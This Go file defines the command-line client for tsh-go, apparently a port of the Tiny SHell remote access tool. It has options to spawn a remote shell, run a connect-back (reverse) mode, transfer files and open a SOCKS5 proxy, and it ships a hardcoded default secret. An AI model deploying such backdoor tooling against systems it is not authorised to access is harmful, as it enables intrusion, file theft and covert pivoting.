package cmd

import (
	"tsh-go/internal/client"
	"tsh-go/internal/constants"

	"github.com/spf13/cobra"
)

func init() {
	clientCmd.PersistentFlags().StringVarP(&clientSecret, "secret", "s", "konpeko", "Pre-shared secret for encryption")
	clientCmd.PersistentFlags().StringVarP(&clientHost, "host", "h", "", "Target host, use 'cb' for connect-back mode")
	clientCmd.MarkPersistentFlagRequired("host")
	clientCmd.PersistentFlags().IntVarP(&clientPort, "port", "p", 2413, "Target port")
	clientCmd.AddCommand(clientGetCmd)
	clientCmd.AddCommand(clientPutCmd)
	clientSocks5Cmd.Flags().StringVarP(&clientSocks5Addr, "sock", "a", "localhost:9050", "Listen address for SOCKS5 proxy")
	clientCmd.AddCommand(clientSocks5Cmd)
	rootCmd.AddCommand(clientCmd)
}

var clientHost string
var clientSecret string
var clientPort int
var clientSocks5Addr string

var clientCmd = &cobra.Command{
	Use:   "client [flags] <hostname|cb> [cmd]",
	Args:  cobra.MaximumNArgs(1),
	Short: "Tiny SHell client",
	Long: `Tiny SHell client, connect to remote server and spawn a shell.
Accepts cmd to run on remote server.

Examples:
  tsh client -h 172.16.123.45
  tsh client -h cb -p 1337
  tsh client -h 127.0.0.1 -s hello 'ls -la /'`,
	Run: func(cmd *cobra.Command, args []string) {
		client.Run([]byte(clientSecret), clientHost, clientPort, clientSocks5Addr, constants.RunShell, args)
	},
}

var clientGetCmd = &cobra.Command{
	Use:   "get <source-file> <dest-dir>",
	Args:  cobra.ExactArgs(2),
	Short: "Get file from remote",
	Run: func(cmd *cobra.Command, args []string) {
		client.Run([]byte(clientSecret), clientHost, clientPort, clientSocks5Addr, constants.GetFile, args)
	},
}
var clientPutCmd = &cobra.Command{
	Use:   "put <source-file> <dest-dir>",
	Args:  cobra.ExactArgs(2),
	Short: "Put local file to remote",
	Run: func(cmd *cobra.Command, args []string) {
		client.Run([]byte(clientSecret), clientHost, clientPort, clientSocks5Addr, constants.PutFile, args)
	},
}
var clientSocks5Cmd = &cobra.Command{
	Use:   "socks5 ",
	Args:  cobra.NoArgs,
	Short: "Start a local socks5 proxy",
	Run: func(cmd *cobra.Command, args []string) {
		client.Run([]byte(clientSecret), clientHost, clientPort, clientSocks5Addr, constants.SOCKS5, args)
	},
}
